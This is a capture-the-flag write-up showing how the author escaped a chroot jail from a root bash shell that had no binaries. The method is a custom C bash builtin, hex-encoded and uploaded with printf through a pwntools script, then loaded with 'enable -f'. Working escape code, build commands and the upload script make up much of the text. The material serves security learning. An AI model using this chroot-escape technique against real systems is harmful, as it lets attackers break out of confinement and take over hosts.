---
title: "solitary confinement"
description: "It's lonely in here..."
pubDate: 2025-07-11
ctf: "SCONES 2025"
category: "misc"
author: "sealldev"
section: "CTFs"
image: "images/24-scones/icon.png"
---

## Easy Peasy

We start this challenge with a netcat connection to a bash shell, which starts as a root shell.
```bash
$ nc localhost 31337
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
--------------------------------------------------------------------------------
bash-5.2#
```

Trying a simple `whoami` and some other commands quickly reveals the problems...

```bash
bash-5.2# whoami
whoami
bash: whoami: command not found
bash-5.2# ls
ls
bash: ls: command not found
bash-5.2# cat
cat
bash: cat: command not found
```

We have no binaries, and trying to use some basic bash jail knowledge, there are no files..?

```bash
bash-5.2# . *
. *
bash: *: No such file or directory
bash-5.2# . .*
. .*
bash: .*: No such file or directory
bash-5.2# . ../*
. ../*
bash: ../*: No such file or directory
bash-5.2# . /*
. /*
bash: /*: No such file or directory
```

We have `pwd`, which shows we are in the `/` directory? What's going on here?
```bash
bash-5.2# pwd
pwd
/
```

## The jail reveals itself

We are likely inside a `chroot` jail. I'll let Wikipedia explain `chroot` as it will likely do a better job than me:
> `chroot` is a shell command and a system call on Unix and Unix-like operating systems that changes the apparent root directory for the current running process and its children.

Looking online there are routes to escape chroot jails from HackTricks. But we need to execute either Python, C or Perl code. As `gcc`, `python`/`python3` and `perl` are not on the machine. I test out uploading a precompiled C binary using `printf` and piping the output like so:

```bash
bash-5.2# printf "\x00\x00\x08..." >> a
printf "\x00\x00\x08..." >> a
...
```

But, we don't have `chmod` so we can't even make it executable, so now what?

We can use `set` to reveal our environment variables, but there isn't much of use in here:
```bash
bash-5.2# set
set
BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:globskipdots:hostcomplete:interactive_comments:patsub_replacement:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="2" [2]="21" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.2.21(1)-release'
COLUMNS=80
DIRSTACK=()
EUID=0
GROUPS=()
HISTFILE=//.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOSTNAME=solitary
HOSTTYPE=x86_64
IFS=$' \t\n'
LINES=24
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
PIPESTATUS=([0]="127")
PPID=1
PS1='\s-\v\$ '
PS2='> '
PS4='+ '
PWD=/
SHELL=/bin/sh
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments
SHLVL=2
TERM=dumb
UID=0
_=...
```

The other bash utility we can use is `enable`.

Using `enable` lists all available bash builtins:
```
bash-5.2# enable
enable
enable .
enable :
enable [
enable alias
enable bg
enable bind
...
enable unalias
enable unset
enable wait
```

Originally I checked through this for any disabled utilities, but the thing I missed was the key feature (just need to RTFM...)

## `enable` cracks the code

I check what `enable` does with the help page:
```
bash-5.2# help enable
enable: enable [-a] [-dnps] [-f filename] [name ...]
    Enable and disable shell builtins.

    Enables and disables builtin shell commands.  Disabling allows you to
    execute a disk command which has the same name as a shell builtin
    without using a full pathname.

    Options:
      -a        print a list of builtins showing whether or not each is enabled
      -n        disable each NAME or display a list of disabled builtins
      -p        print the list of builtins in a reusable format
      -s        print only the names of Posix `special' builtins

    Options controlling dynamic loading:
      -f        Load builtin NAME from shared object FILENAME
      -d        Remove a builtin loaded with -f

    Without options, each NAME is enabled.

    To use the `test' found in $PATH instead of the shell builtin
    version, type `enable -n test'.

    Exit Status:
    Returns success unless NAME is not a shell builtin or an error occurs.
```

The important note is the `-f` option, we can load out own bash builtin. Presumably these are built with C and don't require execute permissions, so we can load a `chroot` escape and break out of the jail!

## Escaping

I used the help of Claude to generate a sample builtin and then included my own breakout code:
```c
#include "builtins.h"
#include "shell.h"
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>

int escape_builtin(WORD_LIST *list) {
    mkdir(".breakout", 0755);
    chroot(".breakout");
    
    for (int i = 0; i < 1024; i++) {
        chdir("..");
    }
    
    chroot(".");
    
    execl("/bin/bash", "bash", NULL);
    
    return EXECUTION_FAILURE;
}

struct builtin escape_struct = {
    "escape",
    escape_builtin,
    BUILTIN_ENABLED,
    (char **)0,
    "escape - attempt chroot escape",
    0
};
```


I then had to build it, making sure to include the bash builtins during compilation (make sure to install the relevant bash dev packages):
```bash
$ gcc -fPIC -shared -I/usr/include/bash -I/usr/include/bash/include -o escape.so escape.c
```

Once compiled, we need to convert it to hex compatible with `printf`. `xxd` converts it to hex and usage of `sed` and `tr` will do the rest.

```bash
$ xxd -p -c1 escape.so | sed 's/^/\\x/' | tr -d '\n' > escape.hex
```

A quick test of our methodology indicates everything is working:
```bash
$ printf $(cat escape.hex) > escape2.so
$ file escape*.so
escape.so:  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=84c9a1e00b4d0a363a750639246160dc09a8dfd3, not stripped
escape2.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=84c9a1e00b4d0a363a750639246160dc09a8dfd3, not stripped
```

Now we can use `split` to chunk it up into copy-pastable parts for the netcat shell. In the end I wrote a pwntools script for this after the CTF to do this for me.

```python
#!/usr/bin/env python3

from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 31337)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return start_remote(argv, *a, **kw)

io = start()

CHUNK_SIZE = 3700 #chosen arbitrarily

so_object = open('escape.hex', 'r')

print("Sending chunks!")
chunk = so_object.read(CHUNK_SIZE)
while chunk:
    io.send(f'printf "{chunk}" >> a\n')
    chunk = so_object.read(CHUNK_SIZE)
so_object.close()

print("Chunks sent!")

io.interactive()
```

We can then use the script to upload the binary for us:
```bash
$ python3 send.py
[+] Opening connection to localhost on port 31337: Done
Sending chunks!
Chunks sent!
[*] Switching to interactive mode
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
--------------------------------------------------------------------------------
<f\x5f\x67\x6d\x6f\x6e\x5f\x73\x74\x61\x72\x74" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<a\x52\x00\x01\x78\x10\x01\x1b\x0c\x07\x08\x90" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x17" >> a
<0\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x12\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00" >> a
<0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" >> a
bash-5.2# $ 
```

We can now use `enable` to escape the bash jail!

```bash
$ enable -f ./a escape
enable -f ./a escape
bash-5.2# $ escape
escape
$ ls
bin
etc
flag
home
jail
lib
lib64
opt
root
sbin
solitary
usr
var
$ cat flag
SCONES{s0rry_about_th3_war_cr1mes}
```

And there is the flag!

Flag: `SCONES{s0rry_about_th3_war_cr1mes}`


